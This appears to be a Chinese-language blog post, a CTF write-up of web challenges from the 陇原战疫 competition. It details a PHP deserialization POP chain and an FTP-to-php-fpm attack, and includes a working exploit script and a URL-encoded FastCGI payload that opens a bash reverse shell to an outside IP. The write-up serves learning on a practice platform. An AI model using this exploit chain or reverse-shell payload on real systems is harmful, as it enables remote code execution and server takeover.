@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+  <meta name="description" content="陇原战疫web部分wp前言复现环境 https:&#x2F;&#x2F;buuoj.cn&#x2F;match&#x2F;matches&#x2F;57&#x2F;challenges ​        第一次打公益CTF，又学到一些东西，从上午九点到下午一点解出了一个web题,另一个web题CheckIN登陆后不知道要怎么打:) 某种意义上来说，这好像还是自己打的最好的一次 ​        看V&amp;N的师傅们全程乱杀，tql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="陇原战&#39;疫&#39;">
+<meta property="og:url" content="http://example.com/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB/index.html">
+<meta property="og:site_name" content="smcq&#39;s blog">
+<meta property="og:description" content="陇原战疫web部分wp前言复现环境 https:&#x2F;&#x2F;buuoj.cn&#x2F;match&#x2F;matches&#x2F;57&#x2F;challenges ​        第一次打公益CTF，又学到一些东西，从上午九点到下午一点解出了一个web题,另一个web题CheckIN登陆后不知道要怎么打:) 某种意义上来说，这好像还是自己打的最好的一次 ​        看V&amp;N的师傅们全程乱杀，tql">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211107170845606.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211107171045181.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211107174139357.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/Snipaste_2021-11-07_13-05-43.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/Snipaste_2021-11-07_13-04-57.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/Snipaste_2021-11-07_15-03-30.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211108124314151.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211108125657634.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114000200703.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211114000010609.png">
+<meta property="article:published_time" content="2021-11-07T10:55:15.000Z">
+<meta property="article:modified_time" content="2021-11-13T16:04:23.000Z">
+<meta property="article:tag" content="php反序列化">
+<meta property="article:tag" content="php-fpm">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211107170845606.png">
+
+<link rel="canonical" href="http://example.com/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>陇原战'疫' | smcq's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">smcq's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">不认,不输  脚踏实地</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/07/%E9%99%87%E5%8E%9F%E6%88%98%E7%96%AB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="smcq's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          陇原战'疫'
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-11-07 18:55:15" itemprop="dateCreated datePublished" datetime="2021-11-07T18:55:15+08:00">2021-11-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-11-14 00:04:23" itemprop="dateModified" datetime="2021-11-14T00:04:23+08:00">2021-11-14</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="陇原战疫web部分wp"><a href="#陇原战疫web部分wp" class="headerlink" title="陇原战疫web部分wp"></a>陇原战疫web部分wp</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>复现环境 <a target="_blank" rel="noopener" href="https://buuoj.cn/match/matches/57/challenges">https://buuoj.cn/match/matches/57/challenges</a></strong></p>
+<p>​        第一次打公益CTF，又学到一些东西，从上午九点到下午一点解出了一个web题,另一个web题CheckIN登陆后不知道要怎么打:)</p>
+<p>某种意义上来说，这好像还是自己打的最好的一次</p>
+<p>​        看V&amp;N的师傅们全程乱杀，tql</p>
+<span id="more"></span>
+
+<p>​        总体感觉还不错，唯一可惜20级其他人都好像有事没报，没有队友一起打有点难受(想哭)</p>
+<p>​        另外就是想看看其他方向咋样，然后密码学第一个题134次解出，看了下，完全不懂:) ,misc有个70多解的，看起来像base64,试了试没解出来，逆向甚至有个200多解的，奈何一窍不通，没看，真的是web学不精，其他也不会。。</p>
+<p>​        确实该考虑下往后的路该怎么走:)</p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211107170845606.png" alt="image-20211107170845606"></p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211107171045181.png" alt="image-20211107171045181"></p>
+<h2 id="赛后部分wp"><a href="#赛后部分wp" class="headerlink" title="赛后部分wp"></a>赛后部分wp</h2><h3 id="eaaasyphp"><a href="#eaaasyphp" class="headerlink" title="eaaasyphp"></a>eaaasyphp</h3><p>题目源码</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Check</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Esle</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token class-name static-context">Check</span><span class="token operator">::</span><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Hint</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"no hint"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>  
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Bunny</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">Check</span><span class="token operator">::</span><span class="token variable">$str2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span> <span class="token operator">=</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'data'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+            <span class="token punctuation">&#125;</span>
+            <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Welcome</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token class-name static-context">Check</span><span class="token operator">::</span><span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token keyword">return</span> <span class="token string double-quoted-string">"Welcome"</span> <span class="token operator">.</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Bypass</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">Check</span><span class="token operator">::</span><span class="token variable">$str1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/image-20211107174139357.png" alt="image-20211107174139357"></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Hint</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"no hint"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"phpinfo"</span><span class="token punctuation">;</span>
+            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">hint</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>  
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>前半部分是个简单的pop链，不过有个小坑，环境是php7.2.20的，它这个Hint坑了我好久，最后问了下zxhy表哥有没有什么奇怪的技巧绕过__wakeup，然后表哥说不能绕，我: ???…</p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">Bypass</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name static-context">Check</span><span class="token operator">::</span><span class="token variable">$str1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+            <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str4</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">&#125;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>接着往下看，这个地方可以 phpinfo()=.=，剩下的路径就很简单了，挨个调用就完事了，然后想写webshell，但发现返回500状态码，无法写入，本地成功了，题目应该是没改写权限，根据题目源码的提示，看phpinfo页面，然后啥也没看出来=.= ，唯一能用的就是file_put_contents函数，去搜了搜有没有rce或者其他的利用点，然后搜到了一些利用FTP打php-fpm的文章（见参考文章），又看了眼phpinfo的信息，应该就是打这个了。</p>
+<p>没接触过，看了几篇，复制粘贴exp打通  <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/226750">https://www.anquanke.com/post/id/226750</a>    <a target="_blank" rel="noopener" href="http://www.hackdig.com/10/hack-522586.htm">http://www.hackdig.com/10/hack-522586.htm</a></p>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Check</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token variable">$str2</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Esle</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$straaa</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token class-name static-context">Check</span><span class="token operator">::</span><span class="token variable">$str1</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">straaa</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Bypass</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$str4</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">str4</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Welcome</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$username</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Bunny</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">class</span> <span class="token class-name-definition class-name">Bunny</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
+    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+    <span class="token punctuation">&#123;</span>
+        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"ftp://39.96.12.202:23/"</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Esle</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token comment">//url传参：http://27086429-f9cd-4715-aebc-56f7b3a25a1a.node4.buuoj.cn:81/?data=%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH105%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00i%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/39.96.12.202/22222%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00&amp;code=O%3A4%3A%22Esle%22%3A1%3A%7Bs%3A6%3A%22straaa%22%3BO%3A6%3A%22Bypass%22%3A1%3A%7Bs%3A4%3A%22str4%22%3BO%3A7%3A%22Welcome%22%3A1%3A%7Bs%3A8%3A%22username%22%3BO%3A5%3A%22Bunny%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A22%3A%22ftp%3A%2F%2F39.96.12.202%3A23%2F%22%3B%7D%7D%7D%7D</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/Snipaste_2021-11-07_13-05-43.png" alt="Snipaste_2021-11-07_13-05-43"></p>
+<p><img src="https://raw.githubusercontent.com/smcq-dbc/upload_picture/main/Snipaste_2021-11-07_13-04-57.png" alt="Snipaste_2021-11-07_13-04-57"></p>
+<p><strong>对于原理还不太懂，找个时间单独测试总结一下这类漏洞的利用方法，留个坑</strong></p>
+<h3 id="CheckIN"><a href="#CheckIN" class="headerlink" title="CheckIN"></a>CheckIN</h3><p>​        一个go题，话说最近这几次比赛遇到go的次数越来越频繁了，抽空得了解下，起码到能搭环境的地步。这个真给我整麻了，给了源码，想本地起个环境测试下，结果各种问题，裂开。</p>
+<pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">loginController</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    
+    session <span class="token operator">:=</span> sessions<span class="token punctuation">.</span><span class="token function">Default</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+    <span class="token keyword">if</span> session<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>
+        c<span class="token punctuation">.</span><span class="token function">Redirect</span><span class="token punctuation">(</span>http<span class="token punctuation">.</span>StatusFound<span class="token punctuation">,</span> <span class="token string">"/home"</span><span class="token punctuation">)</span>
+        <span class="token keyword">return</span>
+    <span class="token punctuation">&#125;</span>
+    
+    username <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span>
+    password <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">PostForm</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span>
+
+    <span class="token keyword">if</span> username <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> password <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>
